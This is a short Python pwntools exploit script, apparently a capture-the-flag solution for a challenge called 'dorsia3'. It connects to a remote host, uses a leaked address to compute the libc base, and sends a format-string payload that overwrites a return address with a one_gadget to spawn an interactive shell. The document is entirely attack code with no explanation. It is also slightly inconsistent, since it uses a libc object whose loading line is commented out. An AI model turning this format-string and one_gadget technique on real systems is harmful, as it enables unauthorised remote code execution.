from pwn import * 

r = remote('dorsia3.wpictf.xyz', 31337)

#libc = ELF('./libc.so.6')

offset = 7

ret_offset = 0x71

one_gadget = 0x3d0d3
one_gadget = 0x3d0d5
one_gadget = 0x3d0e0
#one_gadget = 0x67a7f
#one_gadget = 0x67a80
#one_gadget = 0x137e5e
#one_gadget = 0x137e5f

leak = r.recvuntil('\n').strip()
write = int(leak[:10],16) + ret_offset
libc_base = int(leak[10:],16) + 288 - libc.symbols['system']


oneshot = libc_base + one_gadget


payload = "A"
payload += fmtstr_payload(offset, {write: oneshot}, write_size='byte')
payload += "A"*(69-len(payload))


r.sendline(payload)
r.interactive()


